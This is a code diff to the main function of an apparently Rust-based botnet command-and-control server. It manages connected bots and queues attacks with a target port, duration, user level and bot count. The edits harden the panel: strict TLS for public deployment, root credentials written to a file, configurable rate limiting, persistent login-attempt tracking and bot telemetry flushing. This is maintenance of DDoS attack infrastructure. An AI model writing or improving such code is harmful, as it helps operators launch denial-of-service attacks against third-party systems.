@@ -105,7 +105,10 @@ async fn main() -> Result<()> {
     // Setup TLS if enabled
     let tls_acceptor = if config.enable_tls {
         info!("Setting up TLS encryption...");
-        match setup_tls(&config.cert_path, &config.key_path, config.strict_tls).await {
+        // Enforce strict mode if public deployment
+        let strict_mode = config.strict_tls || config.deployment_mode == "public";
+        
+        match setup_tls(&config.cert_path, &config.key_path, strict_mode).await {
             Ok(acceptor) => {
                 info!("[OK] TLS encryption enabled");
                 Some(Arc::new(acceptor))
@@ -117,12 +120,9 @@ async fn main() -> Result<()> {
             }
         }
     } else {
+        // Config validation ensures we are not in public mode here
         warn!("=================================================================");
-        warn!("⚠️  CRITICAL SECURITY WARNING: TLS IS DISABLED");
-        warn!("=================================================================");
-        warn!("   Passwords and commands will be sent in CLEARTEXT.");
-        warn!("   This configuration is UNSAFE for production use.");
-        warn!("   Enable TLS in server.toml immediately for internet access.");
+        warn!("⚠️  WARNING: TLS IS DISABLED (Local Mode Only)");
         warn!("=================================================================");
         None
     };
@@ -142,12 +142,21 @@ async fn main() -> Result<()> {
             Level::Owner,
         ).await {
             Ok(_) => {
-                warn!("=================================================================");
-                warn!("  ROOT CREDENTIALS - SAVE THESE SECURELY!");
-                warn!("=================================================================");
-                warn!("  Username: root");
-                warn!("  Password: {}", password);
-                warn!("=================================================================");
+                // Write credentials to file securely
+                let creds_path = config_dir.join("root_credentials.txt");
+                let creds_content = format!(
+                    "ROOT CREDENTIALS - GENERATED AT {}\n\nUsername: root\nPassword: {}\n\nKEEP THIS FILE SECURE AND DELETE AFTER USE!", 
+                    chrono::Utc::now(),
+                    password
+                );
+                
+                if let Err(e) = tokio::fs::write(&creds_path, creds_content).await {
+                    error!("Failed to write root credentials to file: {}", e);
+                    // Fallback to stdout if file write fails, but warn heavily
+                    warn!("CRITICAL: Could not write root_credentials.txt. Password: {}", password);
+                } else {
+                    info!("✓ Root user created. Credentials saved to: {}", creds_path.display());
+                }
             },
             Err(e) => error!("Failed to create root user: {}", e),
         }
@@ -164,11 +173,11 @@ async fn main() -> Result<()> {
         Arc::new(BotManager::new(config.max_bot_connections, db_pool.clone())),
         Arc::new(ClientManager::new(config.max_user_connections)),
         Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs, db_pool.clone())),
-        Arc::new(SimpleRateLimiter::new(db_pool.clone(), 10)),  // 10 connections per minute per IP
+        Arc::new(SimpleRateLimiter::new(db_pool.clone(), config.rate_limit_per_minute)),
         user_manager,
         tls_acceptor,
         db_pool.clone(),
-        Arc::new(LoginAttemptTracker::new()),
+        Arc::new(LoginAttemptTracker::new(db_pool.clone())),
         whitelist,
         blacklist,
     ));
@@ -224,6 +233,7 @@ async fn main() -> Result<()> {
                     request.port,
                     request.duration_secs,
                     request.username.clone(),
+                    request.user_level,
                     request.bot_count
                 ).await {
                     Ok(id) => {
@@ -312,6 +322,9 @@ async fn periodic_cleanup(state: Arc<AppState>) {
     loop {
         interval.tick().await;
         
+        // Flush telemetry buffer
+        state.bot_manager.flush_telemetry().await;
+
         // Cleanup finished attacks
         state.attack_manager.cleanup_finished().await;
         
